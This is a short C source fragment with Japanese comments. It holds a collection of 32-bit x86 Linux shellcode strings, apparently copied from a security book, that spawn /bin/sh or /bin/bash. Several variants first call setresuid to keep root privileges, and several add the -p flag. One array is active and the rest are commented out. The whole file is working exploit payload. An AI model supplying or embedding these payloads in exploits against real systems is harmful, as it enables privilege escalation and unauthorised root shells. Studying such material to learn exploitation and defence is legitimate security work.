//書籍のシェルコードをそのまま使用した(35byte)
//やっていることはsetresuidを呼び出した後、shを呼び出すシェルコードと同様
char shellcode[]= "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80";

//shを呼び出すシェルコード(25byte)
//char shellcode[] = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80";

//shにpオプションを付加して呼び出すシェルコード(33byte)
//char shellcode[] = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x66\x68\x2d\x70\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80";

//setresuidを呼び出した後、shを呼び出すシェルコード(35byte)
//char shellcode[] = "\x31\xc0\xb0\xa4\x31\xdb\x31\xc9\x99\xcd\x80\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80";

//setresuidを呼び出した後、shにpオプションを付加して呼び出すシェルコード(43byte)
//char shellcode[] = "\x31\xc0\xb0\xa4\x31\xdb\x31\xc9\x99\xcd\x80\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x66\x68\x2d\x70\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80";

//bashを呼び出すシェルコード(26byte)
//char shellcode[] = "\x6a\x0b\x58\x99\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80";

//bashにpオプションを付加して呼び出すシェルコード(34byte)
//char shellcode[] = "\x6a\x0b\x58\x99\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x66\x68\x2d\x70\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80";

//setresuidを呼び出した後、bashを呼び出すシェルコード(36byte)
//char shellcode[] = "\x31\xc0\xb0\xa4\x31\xdb\x31\xc9\x99\xcd\x80\x6a\x0b\x58\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80";

//setresuidを呼び出した後、bashにpオプションを付加して呼び出すシェルコード(44byte)
//char shellcode[] = "\x31\xc0\xb0\xa4\x31\xdb\x31\xc9\x99\xcd\x80\x6a\x0b\x58\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x66\x68\x2d\x70\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80";
